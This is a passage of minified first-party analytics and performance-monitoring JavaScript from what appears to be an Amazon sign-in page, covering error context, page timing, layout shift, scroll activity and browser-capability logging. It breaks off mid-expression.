ue_csm.ue.exec(function(g,e){if(e.ue_err){var f="";e.ue_err.errorHandlers||(e.ue_err.errorHandlers=[]);e.ue_err.errorHandlers.push({name:"fctx",handler:function(a){if(!a.logLevel||"FATAL"===a.logLevel)if(f=g.getElementsByTagName("html")[0].innerHTML){var b=f.indexOf("var ue_t0=ue_t0||+new Date();");if(-1!==b){var b=f.substr(0,b).split(String.fromCharCode(10)),d=Math.max(b.length-10-1,0),b=b.slice(d,b.length-1);a.fcsmln=d+b.length+1;a.cinfo=a.cinfo||{};for(var c=0;c<b.length;c++)a.cinfo[d+c+1+""]=
b[c]}b=f.split(String.fromCharCode(10));a.cinfo=a.cinfo||{};if(!(a.f||void 0===a.l||a.l in a.cinfo))for(c=+a.l-1,d=Math.max(c-5,0),c=Math.min(c+5,b.length-1);d<=c;d++)a.cinfo[d+1+""]=b[d]}}})}},"fatals-context")(document,window);


(function(m,a){function c(k){function f(b){b&&"string"===typeof b&&(b=(b=b.match(/^(?:https?:)?\/\/(.*?)(\/|$)/i))&&1<b.length?b[1]:null,b&&b&&("number"===typeof e[b]?e[b]++:e[b]=1))}function d(b){var e=10,d=+new Date;b&&b.timeRemaining?e=b.timeRemaining():b={timeRemaining:function(){return Math.max(0,e-(+new Date-d))}};for(var c=a.performance.getEntries(),k=e;g<c.length&&k>n;)c[g].name&&f(c[g].name),g++,k=b.timeRemaining();g>=c.length?h(!0):l()}function h(b){if(!b){b=m.scripts;var c;if(b)for(var d=
0;d<b.length;d++)(c=b[d].getAttribute("src"))&&"undefined"!==c&&f(c)}0<Object.keys(e).length&&(p&&ue_csm.ue&&ue_csm.ue.event&&ue_csm.ue.event({domains:e,pageType:a.ue_pty||null,subPageType:a.ue_spty||null,pageTypeId:a.ue_pti||null},"csm","csm.CrossOriginDomains.2"),a.ue_ext=e)}function l(){!0===k?d():a.requestIdleCallback?a.requestIdleCallback(d):a.requestAnimationFrame?a.requestAnimationFrame(d):a.setTimeout(d,100)}function c(){if(a.performance&&a.performance.getEntries){var b=a.performance.getEntries();
!b||0>=b.length?h(!1):l()}else h(!1)}var e=a.ue_ext||{};a.ue_ext||c();return e}function q(){setTimeout(c,r)}var s=a.ue_dserr||!1,p=!0,n=1,r=2E3,g=0;a.ue_err&&s&&(a.ue_err.errorHandlers||(a.ue_err.errorHandlers=[]),a.ue_err.errorHandlers.push({name:"ext",handler:function(a){if(!a.logLevel||"FATAL"===a.logLevel){var f=c(!0),d=[],h;for(h in f){var f=h,g=f.match(/amazon(\.com?)?\.\w{2,3}$/i);g&&1<g.length||-1!==f.indexOf("amazon-adsystem.com")||-1!==f.indexOf("amazonpay.com")||-1!==f.indexOf("cloudfront-labs.amazonaws.com")||
d.push(h)}a.ext=d}}}));a.ue&&a.ue.isl?c():a.ue&&ue.attach&&ue.attach("load",q)})(document,window);





var ue_wtc_c = 3;
ue_csm.ue.exec(function(b,e){function l(){for(var a=0;a<f.length;a++)a:for(var d=s.replace(A,f[a])+g[f[a]]+t,c=arguments,b=0;b<c.length;b++)try{c[b].send(d);break a}catch(e){}g={};f=[];n=0;k=p}function u(){B?l(q):l(C,q)}function v(a,m,c){r++;if(r>w)d.count&&1==r-w&&(d.count("WeblabTriggerThresholdReached",1),b.ue_int&&console.error("Number of max call reached. Data will no longer be send"));else{var h=c||{};h&&-1<h.constructor.toString().indexOf(D)&&a&&-1<a.constructor.toString().indexOf(x)&&m&&-1<
m.constructor.toString().indexOf(x)?(h=b.ue_id,c&&c.rid&&(h=c.rid),c=h,a=encodeURIComponent(",wl="+a+"/"+m),2E3>a.length+p?(2E3<k+a.length&&u(),void 0===g[c]&&(g[c]="",f.push(c)),g[c]+=a,k+=a.length,n||(n=e.setTimeout(u,E))):b.ue_int&&console.error("Invalid API call. The input provided is over 2000 chars.")):d.count&&(d.count("WeblabTriggerImproperAPICall",1),b.ue_int&&console.error("Invalid API call. The input provided does not match the API protocol i.e ue.trigger(String, String, Object)."))}}function F(){d.trigger&&
d.trigger.isStub&&d.trigger.replay(function(a){v.apply(this,a)})}function y(){z||(f.length&&l(q),z=!0)}var t=":1234",s="//"+b.ue_furl+"/1/remote-weblab-triggers/1/OE/"+b.ue_mid+":"+b.ue_sid+":PLCHLDR_RID$s:wl-client-id%3DCSMTriger",A="PLCHLDR_RID",E=b.wtt||1E4,p=s.length+t.length,w=b.mwtc||2E3,G=1===e.ue_wtc_c,B=3===e.ue_wtc_c,H=e.XMLHttpRequest&&"withCredentials"in new e.XMLHttpRequest,x="String",D="Object",d=b.ue,g={},f=[],k=p,n,z=!1,r=0,C=function(){return{send:function(a){if(H){var b=new e.XMLHttpRequest;
b.open("GET",a,!0);G&&(b.withCredentials=!0);b.send()}else throw"";}}}(),q=function(){return{send:function(a){(new Image).src=a}}}();e.encodeURIComponent&&(d.attach&&(d.attach("beforeunload",y),d.attach("pagehide",y)),F(),d.trigger=v)},"client-wbl-trg")(ue_csm,window);


(function(k,d,h){function f(a,c,b){a&&a.indexOf&&0===a.indexOf("http")&&0!==a.indexOf("https")&&l(s,c,a,b)}function g(a,c,b){a&&a.indexOf&&(location.href.split("#")[0]!=a&&null!==a&&"undefined"!==typeof a||l(t,c,a,b))}function l(a,c,b,e){m[b]||(e=u&&e?n(e):"N/A",d.ueLogError&&d.ueLogError({message:a+c+" : "+b,logLevel:v,stack:"N/A"},{attribution:e}),m[b]=1,p++)}function e(a,c){if(a&&c)for(var b=0;b<a.length;b++)try{c(a[b])}catch(d){}}function q(){return d.performance&&d.performance.getEntriesByType?
d.performance.getEntriesByType("resource"):[]}function n(a){if(a.id)return"//*[@id='"+a.id+"']";var c;c=1;var b;for(b=a.previousSibling;b;b=b.previousSibling)b.nodeName==a.nodeName&&(c+=1);b=a.nodeName;1!=c&&(b+="["+c+"]");a.parentNode&&(b=n(a.parentNode)+"/"+b);return b}function w(){var a=h.images;a&&a.length&&e(a,function(a){var b=a.getAttribute("src");f(b,"img",a);g(b,"img",a)})}function x(){var a=h.scripts;a&&a.length&&e(a,function(a){var b=a.getAttribute("src");f(b,"script",a);g(b,"script",a)})}
function y(){var a=h.styleSheets;a&&a.length&&e(a,function(a){if(a=a.ownerNode){var b=a.getAttribute("href");f(b,"style",a);g(b,"style",a)}})}function z(){if(A){var a=q();e(a,function(a){f(a.name,a.initiatorType)})}}function B(){e(q(),function(a){g(a.name,a.initiatorType)})}function r(){var a;a=d.location&&d.location.protocol?d.location.protocol:void 0;"https:"==a&&(z(),w(),x(),y(),B(),p<C&&setTimeout(r,D))}var s="[CSM] Insecure content detected ",t="[CSM] Ajax request to same page detected ",v="WARN",
m={},p=0,D=k.ue_nsip||1E3,C=5,A=1==k.ue_urt,u=!0;ue_csm.ue_disableNonSecure||(d.performance&&d.performance.setResourceTimingBufferSize&&d.performance.setResourceTimingBufferSize(300),r())})(ue_csm,window,document);


var ue_aa_a = "";
if (ue.trigger && (ue_aa_a === "C" || ue_aa_a === "T1")) {
    ue.trigger("UEDATA_AA_SERVERSIDE_ASSIGNMENT_CLIENTSIDE_TRIGGER_190249", ue_aa_a);
}
(function(f,b){function g(){try{b.PerformanceObserver&&"function"===typeof b.PerformanceObserver&&(a=new b.PerformanceObserver(function(b){c(b.getEntries())}),a.observe(d))}catch(h){k()}}function m(){for(var h=d.entryTypes,a=0;a<h.length;a++)c(b.performance.getEntriesByType(h[a]))}function c(a){if(a&&Array.isArray(a)){for(var c=0,e=0;e<a.length;e++){var d=l.indexOf(a[e].name);if(-1!==d){var g=Math.round(b.performance.timing.navigationStart+a[e].startTime);f.uet(n[d],void 0,void 0,g);c++}}l.length===
c&&k()}}function k(){a&&a.disconnect&&"function"===typeof a.disconnect&&a.disconnect()}if("function"===typeof f.uet&&b.performance&&"object"===typeof b.performance&&b.performance.getEntriesByType&&"function"===typeof b.performance.getEntriesByType&&b.performance.timing&&"object"===typeof b.performance.timing&&"number"===typeof b.performance.timing.navigationStart){var d={entryTypes:["paint"]},l=["first-paint","first-contentful-paint"],n=["fp","fcp"],a;try{m(),g()}catch(p){f.ueLogError(p,{logLevel:"ERROR",
attribution:"performanceMetrics"})}}})(ue_csm,window);


if (window.csa) {
    csa("Events")("setEntity", {
        page:{pageType: "AuthenticationPortal", subPageType: "SignInClaimCollect", pageTypeId: ""}
    });
}
csa.plugin(function(c){var m="transitionStart",n="pageVisible",e="PageTiming",t="visibilitychange",s="$latency.visible",i=c.global,r=(i.performance||{}).timing,a=["navigationStart","unloadEventStart","unloadEventEnd","redirectStart","redirectEnd","fetchStart","domainLookupStart","domainLookupEnd","connectStart","connectEnd","secureConnectionStart","requestStart","responseStart","responseEnd","domLoading","domInteractive","domContentLoadedEventStart","domContentLoadedEventEnd","domComplete","loadEventStart","loadEventEnd"],o=i.Math,u=o.max,l=o.floor,d=i.document||{},g=(r||{}).navigationStart,f=g,v=0,p=null;if(i.Object.keys&&[].forEach&&!c.config["KillSwitch."+e]){if(!r||null===g||g<=0||void 0===g)return c.error("Invalid navigation timing data: "+g);p=new S({schemaId:"<ns>.PageLatency.5",producerId:"csa"}),"boolean"!=typeof d.hidden&&"string"!=typeof d.visibilityState||!d.removeEventListener?c.emit(s):h()?(c.emit(s),E(n,g)):c.on(d,t,function e(){h()&&(f=c.time(),d.removeEventListener(t,e),E(m,f),E(n,f),c.emit(s))}),c.once("$unload",I),c.once("$load",I),c.on("$pageTransition",function(){f=c.time()}),c.register(e,{mark:E,instance:function(e){return new S(e)}})}function S(e){var i,r=null,a=e.ent||{page:["pageType","subPageType","requestId"]},o=e.logger||c("Events",{producerId:e.producerId});if(!e||!e.producerId||!e.schemaId)return c.error("The producer id and schema Id must be defined for PageLatencyInstance.");function d(){return i||f}function n(){r=c.UUID()}this.mark=function(n,t){if(null!=n)return t=t||c.time(),n===m&&(i=t),c.once(s,function(){o("log",{messageId:r,__merge:function(e){e.markers[n]=function(e,n){return u(0,n-(e||f))}(d(),t),e.markerTimestamps[n]=l(t)},markers:{},markerTimestamps:{},navigationStartTimestamp:d()?new Date(d()).toISOString():null,schemaId:e.schemaId},{ent:a})}),t},n(),c.on("$beforePageTransition",n)}function E(e,n){e===m&&(f=n);var t=p.mark(e,n);c.emit("$timing:"+e,t)}function I(){if(!v){for(var e=0;e<a.length;e++)r[a[e]]&&E(a[e],r[a[e]]);v=1}}function h(){return!d.hidden||"visible"===d.visibilityState}});csa.plugin(function(e){var m=!!e.config["LCP.elementDedup"],t=!1,n=e("PageTiming"),r=e.global.PerformanceObserver,a=e.global.performance;function i(){return a.timing.navigationStart}function o(){t||function(o){var l=new r(function(e){var t=e.getEntries();if(0!==t.length){var n=t[t.length-1];if(m&&""!==n.id&&n.element&&"IMG"===n.element.tagName){for(var r={},a=t[0],i=0;i<t.length;i++)t[i].id in r||(""!==t[i].id&&(r[t[i].id]=!0),a.startTime<t[i].startTime&&(a=t[i]));n=a}l.disconnect(),o({startTime:n.startTime,renderTime:n.renderTime,loadTime:n.loadTime})}});try{l.observe({type:"largest-contentful-paint",buffered:!0})}catch(e){}}(function(e){e&&(t=!0,n("mark","largestContentfulPaint",Math.floor(e.startTime+i())),e.renderTime&&n("mark","largestContentfulPaint.render",Math.floor(e.renderTime+i())),e.loadTime&&n("mark","largestContentfulPaint.load",Math.floor(e.loadTime+i())))})}r&&a&&a.timing&&(e.once("$unload",o),e.once("$load",o),e.register("LargestContentfulPaint",{}))});csa.plugin(function(r){var e=r("Metrics",{producerId:"csa"}),n=r.global.PerformanceObserver;n&&(n=new n(function(r){var t=r.getEntries();if(0===t.length||!t[0].processingStart||!t[0].startTime)return;!function(r){r=r||0,n.disconnect(),0<=r?e("recordMetric","firstInputDelay",r):e("recordMetric","firstInputDelay.invalid",1)}(t[0].processingStart-t[0].startTime)}),function(){try{n.observe({type:"first-input",buffered:!0})}catch(r){}}())});csa.plugin(function(d){var e="Metrics",u=0;function r(e){var i,r=e.producerId,n=e.logger,t=n||d("Events",{producerId:r}),c=(e||{}).dimensions||{},o=-1;if(!r&&!n)return d.error("Either a producer id or custom logger must be defined");function s(){o!==u&&(i=d.UUID(),o=u)}this.recordMetric=function(r,n){s(),t("log",{messageId:i,schemaId:e.schemaId||"<ns>.Metric.3",metrics:{},dimensions:c,__merge:function(e){e.metrics[r]=n}},e.logOptions||{ent:{page:["pageType","subPageType","requestId"]}})}}d.config["KillSwitch."+e]||(new r({producerId:"csa"}).recordMetric("baselineMetricEvent",1),d.on("$beforePageTransition",function(){u++}),d.register(e,{instance:function(e){return new r(e||{})}}))});csa.plugin(function(t){var a,r=(t.global.performance||{}).timing,s=(r||{}).navigationStart||t.time();function e(){a=t.UUID()}function n(i){var r=(i=i||{}).producerId,e=i.logger,o=e||t("Events",{producerId:r});if(!r&&!e)return t.error("Either a producer id or custom logger must be defined");this.mark=function(e,r){var n=(void 0===r?t.time():r)-s;o("log",{messageId:a,schemaId:i.schemaId||"<ns>.Timer.1",markers:{},__merge:function(r){r.markers[e]=n}},i.logOptions)}}r&&(e(),t.on("$beforePageTransition",e),t.register("Timers",{instance:function(r){return new n(r||{})}}))});csa.plugin(function(t){var e="takeRecords",i="disconnect",n="function",o=t("Metrics",{producerId:"csa"}),c=t("PageTiming"),a=t.global,u=t.timeout,r=t.on,f=a.PerformanceObserver,m=0,l=!1,s=0,d=a.performance,h=a.document,v=null,y=!1,g=t.blank;function p(){l||(l=!0,clearTimeout(v),typeof f[e]===n&&f[e](),typeof f[i]===n&&f[i](),o("recordMetric","documentCumulativeLayoutShift",m),c("mark","cumulativeLayoutShiftLastTimestamp",Math.floor(s+d.timing.navigationStart)))}f&&d&&d.timing&&h&&(f=new f(function(t){v&&clearTimeout(v);t.getEntries().forEach(function(t){t.hadRecentInput||(m+=t.value,s<t.startTime&&(s=t.startTime))}),v=u(p,5e3)}),function(){try{f.observe({type:"layout-shift",buffered:!0}),v=u(p,5e3)}catch(t){}}(),g=r(h,"click",function(t){y||(y=!0,o("recordMetric","documentCumulativeLayoutShiftToFirstInput",m),g())}),r(h,"visibilitychange",function(){"hidden"===h.visibilityState&&p()}),t.once("$unload",p))});csa.plugin(function(e){var t,n=e.global,r=n.PerformanceObserver,c=e("Metrics",{producerId:"csa"}),o=0,i=0,a=-1,l=n.Math,f=l.max,u=l.ceil;if(r){t=new r(function(e){e.getEntries().forEach(function(e){var t=e.duration;o+=t,i+=t,a=f(t,a)})});try{t.observe({type:"longtask",buffered:!0})}catch(e){}t=new r(function(e){0<e.getEntries().length&&(i=0,a=-1)});try{t.observe({type:"largest-contentful-paint",buffered:!0})}catch(e){}e.on("$unload",g),e.on("$beforePageTransition",g)}function g(){c("recordMetric","totalBlockingTime",u(i||0)),c("recordMetric","totalBlockingTimeInclLCP",u(o||0)),c("recordMetric","maxBlockingTime",u(a||0)),i=o=0,a=-1}});csa.plugin(function(r){var e="CacheDetection",o="csa-ctoken-",n=r.store,t=r.deleteStored,c=r.config,a=c[e+".RequestID"],i=c[e+".Callback"],s=r.global,u=s.document||{},d=s.Date,f=r("Events"),l=r("Events",{producerId:"csa"});function p(e){try{var n=u.cookie.match(RegExp("(^| )"+e+"=([^;]+)"));return n&&n[2].trim()}catch(e){}}!function(){var e=function(){var e=p("cdn-rid");if(e)return{r:e,s:"cdn"}}()||function(){if(r.store(o+a))return{r:r.UUID().toUpperCase().replace(/-/g,"").slice(0,20),s:"device"}}()||{},n=e.r,c=e.s;if(!!n){var t=p("session-id");!function(e,n,c,t){f("setEntity",{page:{pageSource:"cache",requestId:e,cacheRequestId:a,cacheSource:t},session:{id:c}})}(n,0,t,c),"device"===c&&l("log",{schemaId:"<ns>.CacheImpression.1"},{ent:"all"}),i&&i(n,t,c)}}(),n(o+a,d.now()+36e5),r.once("$load",function(){var c=d.now();t(function(e,n){return 0==e.indexOf(o)&&parseInt(n)<c})})});csa.plugin(function(u){var i,t="Content",e="MutationObserver",n="addedNodes",a="querySelectorAll",s="matches",r="getAttributeNames",o="getAttribute",f="dataset",c="widget",l="producerId",d={ent:{element:1,page:["pageType","subPageType","requestId"]}},h=5,g=u.config[t+".BubbleUp.SearchDepth"]||20,m="csaC",p=m+"Id",y={},v=u.config,b=v[t+".Selectors"]||[],E=v[t+".WhitelistedAttributes"]||{href:1,class:1},I=v[t+".EnableContentEntities"],w=v[t+".EnableContentRenders"],C=v["KillSwitch.ContentRendered"],A=u.global,U=A.document||{},k=U.documentElement,L=A.HTMLElement,N={},O=[],S=function(t,e,n,i){var r=this,o=u("Events",{producerId:t||"csa"});e.type=e.type||c,r.id=e.id,r.l=o,r.e=e,r.el=n,r.rt=i,r.dlo=d,r.log=function(t,e){o("log",t,e||d)},e.id&&o("setEntity",{element:e})},D=S.prototype;function R(t){var e=(t=t||{}).element,n=t.target;return e?function(t,e){var n;n=t instanceof L?H(t)||_(e[l],t,K,u.time()):N[t.id]||B(e[l],0,t,u.time());return n}(e,t):n?T(n):u.error("No element or target argument provided.")}function T(t){var e=function(t){var e=null,n=0;for(;t&&n<g;){if(n++,j(t,p)){e=t;break}t=t.parentElement}return e}(t);return e?H(e):new S("csa",{id:null},null,u.time())}function j(t,e){if(t&&t.dataset)return t.dataset[e]}function q(t,e,n){O.push({n:n,e:t,t:e}),M()}function x(){for(var t=u.time(),e=0;0<O.length;){var n=O.shift();if(y[n.n](n.e,n.t),++e%10==0&&u.time()-t>h)break}i=0,O.length&&M()}function M(){i=i||u.raf(x)}function $(t,e,n){return{n:t,e:e,t:n}}function _(t,e,n,i){var r=u.UUID(),o={id:r},c=T(e);return e[f][p]=r,n(o,e),c&&c.id&&(o.parentId=c.id),B(t,e,o,i)}function B(t,e,n,i){I&&(n.schemaId="<ns>.ContentEntity.2"),n.id=n.id||u.UUID();var r=new S(t,n,e,i);return w&&!C&&r.log({schemaId:"<ns>.ContentRender.1",timestamp:i}),u.emit("$content.register",r),N[n.id]=r}function H(t){return N[(t[f]||{})[p]]}function K(t,e){r in e&&(function(n,i){Object.keys(n[f]).forEach(function(t){if(!t.indexOf(m)&&m.length<t.length){var e=function(t){return(t[0]||"").toLowerCase()+t.slice(1)}(t.slice(m.length));i[e]=n[f][t]}})}(e,t),function(e,n){(e[r]()||[]).forEach(function(t){t in E&&(n[t]=e[o](t))})}(e,t))}k&&U[a]&&A[e]&&(b.push({selector:"*[data-csa-c-type]",entity:K}),b.push({selector:".celwidget",entity:function(t,e){K(t,e),t.slotId=t.slotId||e[o]("cel_widget_id")||e.id,t.type=t.type||c}}),y[1]=function(t,e){t.forEach(function(t){t[n]&&t[n].constructor&&"NodeList"===t[n].constructor.name&&Array.prototype.forEach.call(t[n],function(t){O.unshift($(2,t,e))})})},y[2]=function(o,c){a in o&&s in o&&b.forEach(function(t){for(var e=t.selector,n=o[s](e),i=o[a](e),r=i.length-1;0<=r;r--)O.unshift($(3,{e:i[r],s:t},c));n&&O.unshift($(3,{e:o,s:t},c))})},y[3]=function(t,e){var n=t.e;H(n)||_("csa",n,t.s.entity,e)},y[4]=function(){u.register(t,{instance:R})},new A[e](function(t){q(t,u.time(),1)}).observe(k,{childList:!0,subtree:!0}),q(k,u.time(),2),q(null,u.time(),4),u.on("$content.export",function(e){Object.keys(e).forEach(function(t){D[t]=e[t]})}))});csa.plugin(function(n){var i,t="ContentImpressions",e="KillSwitch.",o="IntersectionObserver",r="getAttribute",s="dataset",c="intersectionRatio",a="csaCId",m=1e3,l=n.global,f=n.config,u=f[e+t],g=f[e+t+".ContentViews"],v=((l.performance||{}).timing||{}).navigationStart||n.time(),d={};function h(t){t&&(t.v=1,function(t){t.vt=n.time(),t.el.log({schemaId:"<ns>.ContentView.3",timeToViewed:t.vt-t.el.rt,pageFirstPaintToElementViewed:t.vt-v})}(t))}function I(t){t&&!t.it&&(t.i=n.time()-t.is>m,function(t){t.it=n.time(),t.el.log({schemaId:"<ns>.ContentImpressed.2",timeToImpressed:t.it-t.el.rt,pageFirstPaintToElementImpressed:t.it-v})}(t))}!u&&l[o]&&(i=new l[o](function(t){t.forEach(function(t){var e=function(t){if(t&&t[r])return d[t[s][a]]}(t.target);if(e){var i=t.intersectionRect;t.isIntersecting&&0<i.width&&0<i.height&&(g||e.v||h(e),.5<=t[c]&&!e.is&&(e.is=n.time(),e.timer=n.timeout(function(){I(e)},m))),t[c]<.5&&!e.it&&e.timer&&(l.clearTimeout(e.timer),e.is=0,e.timer=0)}})},{threshold:[0,.5]}),n.on("$content.register",function(t){var e=t.el;e&&(d[t.id]={el:t,v:0,i:0,is:0,vt:0,it:0},i.observe(e))}))});csa.plugin(function(e){e.config["KillSwitch.ContentLatency"]||e.emit("$content.export",{mark:function(t,n){var o=this;o.t||(o.t=e("Timers",{logger:o.l,schemaId:"<ns>.ContentLatency.1",logOptions:o.dlo})),o.t("mark",t,n)}})});csa.plugin(function(o){var t,n,i="normal",s="reload",e="history",d="new-tab",a="ajax",r=1,c=2,u="lastActive",l="lastInteraction",f="used",p="csa-tabbed-browsing",g="visibilityState",v={"back-memory-cache":1,"tab-switch":1,"history-navigation-page-cache":1},b="<ns>.TabbedBrowsing.2",m="visible",y=o.global,I=o("Events",{producerId:"csa"}),h=y.location||{},T=y.document,w=y.JSON,z=((y.performance||{}).navigation||{}).type,P=o.store,S=o.on,k=o.storageSupport(),x=!1,A={},C={},O={},$={},j=!1,q=!1,B=!1;function E(i){try{return w.parse(P(p,void 0,{session:i})||"{}")||{}}catch(i){o.error('Could not parse storage value for key "'+p+'": '+i)}return{}}function J(i,t){P(p,w.stringify(t||{}),{session:i})}function N(i){var t=C.tid||i.id,n=A[u]||{};n.tid===t&&(n.pid=i.id),$={pid:i.id,tid:t,lastInteraction:C[l]||{},initialized:!0},O={lastActive:n,lastInteraction:A[l]||{},time:o.time()}}function D(i){var t=i===d,n=T.referrer,e=!(n&&n.length)||!~n.indexOf(h.origin||""),a=t&&e,r={type:i,toTabId:$.tid,toPageId:$.pid,transitTime:o.time()-A.time||null};a||function(i,t,n){var e=i===s,a=t?A[u]||{}:C,r=A[l]||{},o=C[l]||{},d=t?r:o;n.fromTabId=a.tid,n.fromPageId=a.pid,e||!d.id||d[f]||(n.interactionId=d.id||null,r.id===d.id&&(r[f]=!0),o.id===d.id&&(o[f]=!0))}(i,t,r),I("log",{navigation:r,schemaId:b},{ent:{page:["pageType","subPageType","requestId"]}})}function F(i){B=function(i){return i&&i in v}(i.transitionType),function(){A=E(!1),C=E(!0);var i=A[l],t=C[l],n=!1,e=!1;i&&t&&i.id===t.id&&i[f]!==t[f]&&(n=!i[f],e=!t[f],t[f]=i[f]=!0,n&&J(!1,A),e&&J(!0,C))}(),N(i),j=!0,function(i){var t,n;t=H(),n=K(),(t||n)&&N(i)}(i)}function G(){x&&!B?D(a):(x=!0,D(z===c||B?e:z===r?C.initialized?s:d:C.initialized?i:d))}function H(){return!(!j||!t)&&(C[l]={id:t.messageId,used:!(A[l]={id:t.messageId,used:!1})},!(t=null))}function K(){var i=!1;if(q=T[g]===m,j){var t=A[u]||{};i=function(i,t,n){var e=!1,a=i[u];return q?a&&a.tid===$.tid&&a[m]&&a.pid===n||(i[u]={visible:!0,pid:n,tid:t},e=!0):a&&a.tid===$.tid&&a[m]&&(e=!(a[m]=!1)),e}(A,C.tid||t.tid||$.tid,C.pid||t.pid||$.pid)}return i}k.local&&k.session&&w&&T&&g in T&&(n=function(){try{return y.self!==y.top}catch(i){return!0}}(),S("$pageChange",function(i){n||(F(i),G(),J(!1,O),J(!0,$),C=$,A=O)},{buffered:1}),S("$content.interaction",function(i){t=i,H()&&(J(!1,A),J(!0,C))}),S(T,"visibilitychange",function(){!n&&K()&&J(!1,A)},{capture:!1,passive:!0}))});csa.plugin(function(c){var e=c("Metrics",{producerId:"csa"});c.on(c.global,"pageshow",function(c){c&&c.persisted&&e("recordMetric","bfCache",1)})});csa.plugin(function(e){var n,a,c,r,s,t,u,f,l,p,o,i="hasFocus",m="avail",h="client",d="document",g="inner",v="offset",b="screen",y="scroll",T="Width",w="Height",P=m+T,S=m+w,I=h+T,x=h+w,D=g+T,E=g+w,F=v+T,O=v+w,$=y+T,q=y+w,z=e("Events",{producerId:"csa"}),C=e.global||{},H=e.time,M=e.on,R=e.once,W=C[d]||{},X=C[b]||{},Y=C.Math||{},j=Y.abs,k=Y.max,A=Y.ceil,B=((C.performance||{}).timing||{}).responseStart,G=C.P||{},J=100;function K(){f=a=s=t=n,c=r=0,u=l=p=o=0}function L(){var e=H(),n=j(C.pageXOffset||0),t=j(C.pageYOffset||0),o=C[D]||0,i=C[E]||0;!function(e){B&&!s&&(f=A((s=e)-B))}(e),function(e,n,t){var o=n-c,i=t-r;a&&!(a&&a<=e)||((o||i)&&++u,c=n,r=t,o,i),a=e+J}(e,n,t),function(e,n,t,o,i){l=A(k(l,t+i)),n&&(p=A(k(p,n+o)))}(0,n,t,o,i)}function N(){t&&(o+=A(H()-t),t=n)}function Q(){t=t||H()}function U(e,n,t,o){n[e+T]=A(t||0),n[e+w]=A(o||0)}function V(){var e,n=function(){var e={},n=W.documentElement||{},t=W.body||{};return U("availableScreen",e,X[P],X[S]),U(d,e,k(t[$]||0,t[F]||0,n[I]||0,n[$]||0,n[F]||0),k(t[q]||0,t[O]||0,n[x]||0,n[q]||0,n[O]||0)),U(b,e,X.width,X.height),U("viewport",e,C[D],C[E]),e}();W[i]()&&N(),e={scrollCounts:u,reachedDepth:l,horizontalScrollDistance:p,dwellTime:o},"number"==typeof f&&(e.clientTimeToFirstScroll=f),K(),B=H(),W[i]()&&(t=B),z("log",{activity:e,dimensions:n,schemaId:"<ns>.PageInteractionsSummary.1"},{ent:{page:["pageType","subPageType","requestId"]}})}"function"==typeof W[i]&&(K(),M(C,y,L,{passive:!0}),M(C,"blur",N),M(C,"focus",Q),G.when&&G.when("mash").execute(function(e){e&&(M(e,"appPause",N),M(e,"appResume",Q))}),W[i]()&&(t=B||H()),R("$beforeunload",V),M("$beforePageTransition",V))});csa.plugin(function(e){var o,n,r="<ns>.Navigator.4",a=e.global,i=a.navigator||{},d=i.connection||{},c=a.Math.round,t=e("Events",{producerId:"csa"});function l(){o={network:{downlink:void 0,downlinkMax:void 0,rtt:void 0,type:void 0,effectiveType:void 0,saveData:void 0},language:void 0,doNotTrack:void 0,hardwareConcurrency:void 0,deviceMemory:void 0,cookieEnabled:void 0,webdriver:void 0},v(),o.language=i.language||null,o.doNotTrack=function(){switch(i.doNotTrack){case"1":return"enabled";case"0":return"disabled";case"unspecified":return i.doNotTrack;default:return null}}(),o.hardwareConcurrency="hardwareConcurrency"in i?c(i.hardwareConcurrency||0):null,o.deviceMemory="deviceMemory"in i?c(i.deviceMemory||0):null,o.cookieEnabled="cookieEnabled"in i?i.cookieEnabled:null,o.webdriver="webdriver"in i?i.webdriver:null}function u(){t("log",{network:(n={},Object.keys(o.network).forEach(function(e){n[e]=o.network[e]+""}),n),language:o.language,doNotTrack:o.doNotTrack,hardwareConcurrency:o.hardwareConcurrency,deviceMemory:o.deviceMemory,cookieEnabled:o.cookieEnabled,webdriver:o.webdriver,schemaId:r},{ent:{page:["pageType","subPageType","requestId"]}})}function v(){!function(n){Object.keys(o.network).forEach(function(e){o.network[e]=n[e]})}({downlink:"downlink"in d?c(d.downlink||0):null,downlinkMax:"downlinkMax"in d?c(d.downlinkMax||0):null,rtt:"rtt"in d?(d.rtt||0).toFixed():null,type:d.type||null,effectiveType:d.effectiveType||null,saveData:"saveData"in d?d.saveData:null})}function k(){v(),u()}function w(){l(),u()}l(),u(),e.on("$afterPageTransition",w),e.on(d,"change",k)});
(function(t,B,D){var u=function(){var a,c=function(){return null!=a?a:a=function(){var a=[],c="unknown",b={trident:0,gecko:0,presto:0,webkit:0,unknown:-1},d,e={},c=document.createElement("nadu");for(d in c.style)if(c=(/^([A-Za-z][a-z]*)[A-Z]/.exec(d)||[])[1])c=c.toLowerCase(),c in e?e[c]++:e[c]=1;for(var n in e)a.push([n,e[n]]);a=a.sort(function(a,c){return c[1]-a[1]}).slice(0,10);for(d=0;d<a.length;d++)switch(a[d][0]){case "moz":b.gecko+=5;break;case "ms":b.trident+=5;break;case "get":b.webkit++;
break;case "webkit":b.webkit+=5;break;case "o":b.presto+=2;break;case "xv":b.presto+=2}"onhelp"in window&&b.trident++;"maxConnectionsPerServer"in window&&b.trident++;try{void 0!==window.ActiveXObject.toString&&(b.trident+=5)}catch(r){}void 0!==function(){}.toSource&&(b.gecko+=5);var a="unknown",q;for(q in b)b[q]>b[a]&&(a=q);return a}()},b=function(){return!!window.opera||!!window.opr&&!!window.opr.addons},d=function(){return!!document.documentMode},e=function(){return!d()&&"undefined"!==typeof CSS&&
CSS.supports("(-ms-ime-align:auto)")},n=function(){return"webkit"==c()},r=function(){return void 0!==B.chrome&&"Opera Software ASA"!=navigator.vendor&&void 0===navigator.msLaunchUri&&n()};return{isOpera:b,isIE:d,isEdge:e,isFirefox:function(){return"undefined"!==typeof InstallTrigger},isWebkit:n,isChrome:r,isSafari:function(){return!r()&&!e()&&!b()&&"WebkitAppearance"in document.documentElement.style}}}(),q=function(a,c,b,d){a.addEventListener?a.addEventListener(c,b,d):a.attachEvent&&a.attachEvent("on"+
c,b)},r=function(a,c,b,d){document.removeEventListener?a.removeEventListener(c,b,d||!1):document.detachEvent&&a.detachEvent("on"+c,b)},H=function(a){var c;a=a.document;"undefined"!==typeof a.hidden?c="visibilitychange":"undefined"!==typeof a.mozHidden?c="mozvisibilitychange":"undefined"!==typeof a.msHidden?c="msvisibilitychange":"undefined"!==typeof a.webkitHidden&&(c="webkitvisibilitychange");return c},T=function(a,c){var b=H(a),d=a.document;b&&q(d,b,c,!1)},U=function(a){var c=window.addEventListener?
